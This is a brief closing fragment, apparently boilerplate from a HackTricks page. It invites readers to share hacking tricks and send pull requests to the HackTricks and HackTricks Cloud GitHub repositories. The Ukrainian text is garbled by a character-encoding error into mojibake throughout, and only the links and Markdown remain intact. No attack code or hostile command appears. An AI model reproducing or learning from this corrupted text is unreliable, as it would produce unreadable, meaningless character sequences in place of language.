* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
